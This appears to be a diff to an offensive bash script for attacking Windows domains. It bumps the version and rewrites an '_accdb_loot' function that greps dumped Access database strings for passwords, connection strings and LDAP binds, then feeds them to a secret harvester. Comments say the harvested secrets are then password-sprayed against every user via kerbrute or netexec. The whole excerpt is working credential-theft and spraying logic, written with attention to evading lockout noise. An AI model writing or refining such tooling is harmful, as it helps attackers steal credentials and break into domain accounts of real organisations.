@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.49.1"
+readonly VERSION="1.49.2"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -4740,7 +4740,15 @@ _accdb_loot() {
         sort -u -o "$OUTDIR/users_all.txt" "$OUTDIR/users_all.txt" 2>/dev/null
     fi
 
-    harvest_secrets <<<"$txt" "accdb:${base}"
+    # Feed ONLY credential-bearing lines to the generic harvester. The full string
+    # dump of an Access DB is mostly VBA/Office internals (Module1, Office16, base64
+    # blobs, GUIDs) — passing all of it floods FOUND_SECRETS with junk tokens that the
+    # spray then tries against every user (slow + lockout risk). The real user/pass is
+    # already queued by the domain-anchored extractor above. Process substitution, not
+    # a pipe, so add_secret/queue_cred run in THIS shell (not a lost subshell).
+    harvest_secrets "accdb:${base}" < <(printf '%s\n' "$txt" \
+        | grep -iE 'password|passwd|pwd|secret|connection ?string|;uid=|;pwd=|user[ _]?id|ldap://|bind' \
+        | grep -ivE 'schemas\.microsoft|keyEncryptor|encryptedVerifier')
 }
 
 crack_file() {
